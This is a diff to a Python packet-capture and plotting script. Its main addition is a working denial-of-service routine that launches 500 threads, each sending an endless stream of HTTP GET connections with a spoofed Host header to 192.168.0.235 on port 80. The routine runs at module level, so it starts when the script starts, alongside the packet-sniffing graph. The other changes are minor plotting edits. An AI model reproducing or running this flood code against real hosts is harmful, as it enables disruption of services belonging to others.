@@ -5,6 +5,30 @@ import matplotlib.pyplot as plt
 from matplotlib.animation import FuncAnimation
 import time
 import numpy as np 
+import threading
+
+target =  '192.168.0.235'
+fake_ip = '182.21.20.32'
+port = 80
+running = True
+def attack():
+       global running
+       while running:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((target, port))
+            s.sendto("GET / HTTP/1.1\r\n".encode('ascii'), (target, port))
+            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
+            s.close()
+        except ConnectionAbortedError:
+            pass
+        except Exception as e:
+            print(f"Unexpected error: {e}")
+        
+for i in range(500):
+    thread = threading.Thread(target=attack)
+    thread.start()
+
 
 def ipv4_packet(data):
     version_header_length = data[0]
@@ -40,8 +64,8 @@ conn.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
 conn.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON) 
 
 def init():
-    ax.set_xlim(0, 105)  # This sets the initial x-axis limits. You can adjust these values
-    ax.set_ylim(0, 500)  # This sets the initial y-axis limits. Adjust as per your requirements
+    ax.set_xlim(0, 105)
+    ax.set_ylim(0, 500)
     return line,
 
 def update(frame):
@@ -68,9 +92,15 @@ def update(frame):
         i += 1
     
     line.set_data(df["Packet Count"], df["Time miliseconds"])
+    ax.relim()
+    ax.autoscale_view()
+    
     return line,
 
 ani = FuncAnimation(fig, update, frames=range(0, 105), init_func=init, blit=True, repeat=False)
 plt.xlabel('Packet Count')
 plt.ylabel('Elapsed Time (s)')
-plt.show()
+plt.ion
+plt.show(block = True)
+
+    
